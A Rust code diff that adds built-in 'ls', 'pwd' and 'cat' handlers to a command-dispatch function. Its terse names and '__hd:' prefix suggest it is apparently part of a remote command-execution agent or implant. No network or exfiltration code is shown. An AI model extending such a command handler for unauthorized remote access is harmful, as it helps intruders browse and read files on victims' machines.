@@ -129,6 +129,30 @@ fn un() -> String {
     { std::env::var("USER").unwrap_or_default() }
 }
 
+fn native_ls(c: &str) -> String {
+    let arg = if c.starts_with("ls ") || c.starts_with("dir ") {
+        c.splitn(2, ' ').nth(1).unwrap_or(".").trim()
+    } else { "." };
+    let path = if arg.is_empty() { "." } else { arg };
+    let entries = match std::fs::read_dir(path) {
+        Ok(rd) => rd,
+        Err(e) => return format!("Error: {}", e),
+    };
+    let mut lines = Vec::new();
+    for entry in entries {
+        let entry = match entry { Ok(e) => e, Err(_) => continue };
+        let md = entry.metadata();
+        let name = entry.file_name().to_string_lossy().into_owned();
+        let (size, is_dir) = match &md {
+            Ok(m) => (m.len(), m.is_dir()),
+            Err(_) => (0, false),
+        };
+        let prefix = if is_dir { "d" } else { "-" };
+        lines.push(format!("{} {:>12}  {}", prefix, size, name));
+    }
+    if lines.is_empty() { "Directory is empty".into() } else { lines.join("\n") }
+}
+
 fn ex(c: &str) -> String {
     if let Some(rest) = c.strip_prefix("__hd:") {
         #[cfg(windows)]
@@ -139,6 +163,19 @@ fn ex(c: &str) -> String {
     if c.starts_with("cd ") {
         return match std::env::set_current_dir(c[3..].trim()) {
             Ok(_) => format!("Changed directory to {}", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default()),
+            Err(e) => format!("Error: {}", e),
+        };
+    }
+    if c == "ls" || c == "dir" || c.starts_with("ls ") || c.starts_with("dir ") {
+        return native_ls(c);
+    }
+    if c == "pwd" {
+        return std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_else(|e| format!("Error: {}", e));
+    }
+    if c.starts_with("cat ") || c.starts_with("type ") {
+        let path = c.splitn(2, ' ').nth(1).unwrap_or("").trim();
+        return match std::fs::read(path) {
+            Ok(data) => String::from_utf8_lossy(&data).into_owned(),
             Err(e) => format!("Error: {}", e),
         };
     }
